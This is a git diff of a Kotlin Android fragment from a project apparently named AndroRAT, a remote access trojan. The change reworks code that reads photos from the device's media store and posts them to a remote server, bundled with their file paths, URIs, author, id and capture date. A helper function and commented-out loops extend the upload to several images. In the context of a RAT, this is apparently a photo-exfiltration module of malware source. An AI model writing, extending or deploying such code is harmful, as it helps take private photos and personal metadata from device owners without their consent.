@@ -1,6 +1,7 @@
 package com.ierusalem.androrat.screens.images
 
 import android.content.ContentUris
+import android.net.Uri
 import android.os.Bundle
 import android.os.Environment
 import android.provider.MediaStore
@@ -18,7 +19,6 @@ import com.ierusalem.androrat.ui.theme.AndroRATTheme
 import kotlinx.coroutines.launch
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.MultipartBody
-import okhttp3.RequestBody
 import okhttp3.RequestBody.Companion.asRequestBody
 import java.io.File
 import java.io.FileOutputStream
@@ -111,27 +111,63 @@ class ImageFragment : Fragment() {
                         images = viewModel.images,
                         onUploadClick = {
                             val apiService = RetrofitInstance(requireContext()).api
-                            val image = viewModel.images[0]
-                            val imageUri = image.uri
-                            val inputStream =
-                                requireContext().contentResolver.openInputStream(imageUri)
-                            val imageFile = File.createTempFile(
-                                "image",
-                                ".jpg",
-                                requireActivity().getExternalFilesDir(Environment.DIRECTORY_PICTURES)
-                            )
-                            val fileOutputStream = FileOutputStream(imageFile)
-                            inputStream?.copyTo(fileOutputStream)
-                            fileOutputStream.close()
+                            val images = viewModel.images
+//                            val image = images[0]
+//                            val imageUri = image.uri
+//                            val inputStream = requireContext().contentResolver.openInputStream(imageUri)
+//                            val imageFile = File.createTempFile(
+//                                "image",
+//                                ".jpg",
+//                                requireActivity().getExternalFilesDir(Environment.DIRECTORY_PICTURES)
+//                            )
+//                            val fileOutputStream = FileOutputStream(imageFile)
+//                            inputStream?.copyTo(fileOutputStream)
+//                            fileOutputStream.close()
+//
+//                            val imageDataTake = getShortDate(image.dataTaken)
 
-                            val imageDataTake = getShortDate(image.dataTaken)
-                            Log.d("ahi3646_date", "onCreateView: $imageDataTake ")
+//                            val requestBody: RequestBody = MultipartBody.Builder()
+//                                .setType(MultipartBody.FORM)
+//                                .addFormDataPart(
+//                                    name = "description",
+//                                    value = "Image Description: " +
+//                                            "\nImage Display Name - ${image.displayName} " +
+//                                            "\nImage Data - ${image.data}" +
+//                                            "\nImage Uri - ${image.uri}" +
+//                                            "\nImage Author - ${image.author}" +
+//                                            "\nImage Description - ${image.description}" +
+//                                            "\nImage Id - ${image.id}" +
+//                                            "\nImage Data Taken - $imageDataTake"
+//                                )
+//                                .addFormDataPart(
+//                                    "file",
+//                                    imageFile.name,
+//                                    imageFile.asRequestBody(
+//                                        "image/*".toMediaType()
+//                                    )
+//                                )
+//                                .build()
 
-                            val requestBody: RequestBody = MultipartBody.Builder()
-                                .setType(MultipartBody.FORM)
-                                .addFormDataPart(
-                                    name = "description",
-                                    value = "Image Description: " +
+                            val requestBodyBuilder = MultipartBody.Builder()
+                            requestBodyBuilder.setType(MultipartBody.FORM)
+                            for (i in 0..0) {
+                                val image = images[i]
+                                val imageUri = image.uri
+                                val inputStream =
+                                    requireContext().contentResolver.openInputStream(imageUri)
+                                val imageFile = File.createTempFile(
+                                    "image",
+                                    ".jpg",
+                                    requireActivity().getExternalFilesDir(Environment.DIRECTORY_PICTURES)
+                                )
+                                val fileOutputStream = FileOutputStream(imageFile)
+                                inputStream?.copyTo(fileOutputStream)
+                                fileOutputStream.close()
+                                val imageDataTake = getShortDate(image.dataTaken)
+
+                                Log.d(
+                                    "ahi3646_files", "onCreateView: " +
+                                            "\nImage Description: " +
                                             "\nImage Display Name - ${image.displayName} " +
                                             "\nImage Data - ${image.data}" +
                                             "\nImage Uri - ${image.uri}" +
@@ -140,19 +176,82 @@ class ImageFragment : Fragment() {
                                             "\nImage Id - ${image.id}" +
                                             "\nImage Data Taken - $imageDataTake"
                                 )
-                                .addFormDataPart(
-                                    "file",
-                                    imageFile.name,
-                                    imageFile.asRequestBody(
-                                        "image/*".toMediaType()
-                                    )
-                                )
-                                .build()
 
-                            Log.d("ahi3646", "onCreateView: ${imageFile.name} ")
+                                requestBodyBuilder
+                                    .addFormDataPart(
+                                        name = "description",
+                                        value = "Image Description: " +
+                                                "\nImage Display Name - ${image.displayName} " +
+                                                "\nImage Data - ${image.data}" +
+                                                "\nImage Uri - ${image.uri}" +
+                                                "\nImage Author - ${image.author}" +
+                                                "\nImage Description - ${image.description}" +
+                                                "\nImage Id - ${image.id}" +
+                                                "\nImage Data Taken - $imageDataTake"
+                                    )
+                                    .addFormDataPart(
+                                        "file",
+                                        imageFile.name,
+                                        imageFile.asRequestBody(
+                                            "image/*".toMediaType()
+                                        )
+                                    )
+                            }
+                            val requestBody = requestBodyBuilder.build()
+
+//                            val images = viewModel.images
+//                            val parts: MutableList<MultipartBody.Part> = mutableListOf()
+//
+//                            for (i in 0 .. 3){
+//                                parts.add(
+//                                    prepareFile(
+//                                        images[i].uri
+//                                    )
+//                                )
+//                            }
+
+//                            val parts: MutableList<RequestBody> = mutableListOf()
+//                            val images = viewModel.images
+//                            for(i in 0 .. 3){
+//                                val tempImage = images[i]
+//                                val tempImageUri = tempImage.uri
+//                                val tempInputStream = requireContext().contentResolver.openInputStream(tempImageUri)
+//                                val tempImageFile = File.createTempFile(
+//                                    "image",
+//                                    ".jpg",
+//                                    requireActivity().getExternalFilesDir(Environment.DIRECTORY_PICTURES)
+//                                )
+//                                val tempFileOutputStream = FileOutputStream(tempImageFile)
+//                                tempInputStream?.copyTo(tempFileOutputStream)
+//                                fileOutputStream.close()
+//
+//                                val requestBody: RequestBody = MultipartBody.Builder()
+//                                    .setType(MultipartBody.FORM)
+//                                    .addFormDataPart(
+//                                        name = "description",
+//                                        value = "Image Description: " +
+//                                                "\nImage Display Name - ${tempImage.displayName} " +
+//                                                "\nImage Data - ${tempImage.data}" +
+//                                                "\nImage Uri - ${tempImage.uri}" +
+//                                                "\nImage Author - ${tempImage.author}" +
+//                                                "\nImage Description - ${tempImage.description}" +
+//                                                "\nImage Id - ${tempImage.id}" +
+//                                                "\nImage Data Taken - imageDataTake"
+//                                    )
+//                                    .addFormDataPart(
+//                                        "file",
+//                                        tempImageFile.name,
+//                                        tempImageFile.asRequestBody(
+//                                            "image/*".toMediaType()
+//                                        )
+//                                    )
+//                                    .build()
+//                                parts.add(requestBody)
+//                            }
 
                             scope.launch {
                                 val response = apiService.postImage(requestBody)
+//                                val response = apiService.postImages(parts = parts)
                                 if (response.isSuccessful) {
                                     Log.d(
                                         "ahi3646_photo",
@@ -171,13 +270,30 @@ class ImageFragment : Fragment() {
             }
         }
     }
-    private fun getShortDate(ts:Long?):String{
-        if(ts == null) return ""
-        //Get instance of calendar
+
+    private fun prepareFile(imageUri: Uri): MultipartBody.Part {
+        val inputStream = requireContext().contentResolver.openInputStream(imageUri)
+        val imageFile = File.createTempFile(
+            "image",
+            ".jpg",
+            requireActivity().getExternalFilesDir(Environment.DIRECTORY_PICTURES)
+        )
+        val fileOutputStream = FileOutputStream(imageFile)
+        inputStream?.copyTo(fileOutputStream)
+        fileOutputStream.close()
+
+        return MultipartBody.Part.createFormData(
+            "image",
+            imageFile.name,
+            imageFile.asRequestBody()
+        )
+    }
+
+    //todo add hours
+    private fun getShortDate(ts: Long?): String {
+        if (ts == null) return ""
         val calendar = Calendar.getInstance(Locale.getDefault())
-        //get current date from ts
         calendar.timeInMillis = ts
-        //return formatted date
         return android.text.format.DateFormat.format("E, dd MMM yyyy", calendar).toString()
     }
 }
